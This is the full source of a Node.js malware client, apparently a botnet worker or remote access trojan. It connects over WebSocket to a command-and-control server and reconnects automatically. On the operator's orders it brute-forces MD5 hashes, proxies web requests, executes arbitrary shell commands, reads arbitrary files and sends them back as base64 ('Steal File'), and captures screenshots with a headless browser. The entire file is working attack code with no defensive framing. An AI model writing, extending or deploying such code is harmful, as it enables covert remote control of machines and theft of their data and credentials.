const WebSocket = require('ws');
const crypto = require('crypto');
const fs = require('fs');
const { exec } = require('child_process'); // Needed for Shell & Screenshots

// REPLACE WITH YOUR RENDER URL!
const WEBSOCKET_URL = 'wss://scavenger-brain.onrender.com'; 

function connect() {
    const ws = new WebSocket(WEBSOCKET_URL);

    ws.on('open', () => ws.send(JSON.stringify({ type: 'REGISTER_WORKER' })));

    ws.on('message', (data) => {
        try {
            const msg = JSON.parse(data);

            // 1. CRACKING JOB (MD5)
            if (msg.type === 'MINING_JOB') {
                crack(ws, msg.start, msg.end, msg.target);
            } 
            
                      // 2. STANDBY COMMAND (Instead of Death)
            else if (msg.type === 'STOP') {
                console.log(`[SYSTEM] Target neutralized: ${msg.solution}`);
                console.log(`[SYSTEM] Mining operations suspended.`);
                console.log(`[SYSTEM] Standing by for C2 commands (Proxy/Shell/Exfil)...`);
                // We DO NOT close the connection. We stay alive.
            }

            // 3. PROXY MODE (Hydra)
            else if (msg.type === 'HTTP_PROXY') {
                console.log(`[PROXY] Requesting: ${msg.url}`);
                fetch(msg.url)
                    .then(async (response) => {
                        const text = await response.text();
                        ws.send(JSON.stringify({
                            type: 'PROXY_RESULT',
                            requestId: msg.requestId,
                            status: response.status,
                            body: text.substring(0, 500) + "..." 
                        }));
                    })
                    .catch(err => {
                        ws.send(JSON.stringify({
                            type: 'PROXY_RESULT',
                            requestId: msg.requestId,
                            error: err.message
                        }));
                    });
            }

            // 4. GHOST SHELL (Remote Execution)
            else if (msg.type === 'EXEC_CMD') {
                console.log(`[SHELL] Executing: ${msg.command}`);
                exec(msg.command, { timeout: 10000 }, (error, stdout, stderr) => {
                    const output = stdout || stderr || (error ? error.message : "Done.");
                    ws.send(JSON.stringify({
                        type: 'SHELL_RESULT',
                        output: output
                    }));
                });
            }

            // 5. EXFILTRATION (Steal File)
            else if (msg.type === 'EXFIL_CMD') {
                const path = msg.path;
                console.log(`[EXFIL] Stealing: ${path}`);

                if (fs.existsSync(path)) {
                    try {
                        const fileData = fs.readFileSync(path, { encoding: 'base64' });
                        ws.send(JSON.stringify({
                            type: 'EXFIL_RESULT',
                            filename: path.split('/').pop(),
                            data: fileData
                        }));
                    } catch (e) {
                        ws.send(JSON.stringify({ type: 'SHELL_LOG', output: `[ERROR] Read failed: ${e.message}` }));
                    }
                } else {
                    ws.send(JSON.stringify({ type: 'SHELL_LOG', output: `[ERROR] File not found: ${path}` }));
                }
            }

            // 6. GHOST EYE (Screenshot)
            else if (msg.type === 'SNAPSHOT_CMD') {
                const targetUrl = msg.url;
                console.log(`[EYE] Spying on: ${targetUrl}`);
                
                const script = `
                    const puppeteer = require('puppeteer');
                    (async () => {
                        try {
                            const browser = await puppeteer.launch({ args: ['--no-sandbox'] });
                            const page = await browser.newPage();
                            await page.setViewport({ width: 1280, height: 720 });
                            await page.goto('${targetUrl}', { waitUntil: 'networkidle2', timeout: 30000 });
                            await page.screenshot({ path: 'evidence.png' });
                            await browser.close();
                        } catch (e) { console.error(e); }
                    })();
                `;
                
                fs.writeFileSync('camera.js', script);
                const cmd = `npm list puppeteer || npm install puppeteer && node camera.js`;
                
                exec(cmd, { timeout: 60000 }, (error, stdout, stderr) => {
                    if (fs.existsSync('evidence.png')) {
                        const fileData = fs.readFileSync('evidence.png', { encoding: 'base64' });
                        ws.send(JSON.stringify({
                            type: 'EXFIL_RESULT',
                            filename: `snapshot_${Date.now()}.png`,
                            data: fileData
                        }));
                    } else {
                        ws.send(JSON.stringify({ type: 'SHELL_LOG', output: `[ERROR] Snapshot failed: ${stderr}` }));
                    }
                });
            }

        } catch (e) {
            console.error("Error processing message:", e);
        }
    });

    ws.on('close', () => setTimeout(connect, 5000));
    ws.on('error', () => ws.close());
}

// --- MD5 CRACKER LOGIC ---
function crack(ws, start, end, targetHash) {
    console.log(`[CRACKER] Brute-forcing range: ${start} - ${end}`);
    for (let i = start; i < end; i++) {
        const guess = i.toString(); 
        const hash = crypto.createHash('md5').update(guess).digest('hex');
        if (hash === targetHash) {
            console.log("!!! PASSWORD CRACKED: " + guess);
            ws.send(JSON.stringify({ type: 'JOB_COMPLETE', solution: guess, hash: hash }));
            return;
        }
    }
    ws.send(JSON.stringify({ type: 'JOB_COMPLETE', solution: null }));
}

connect();
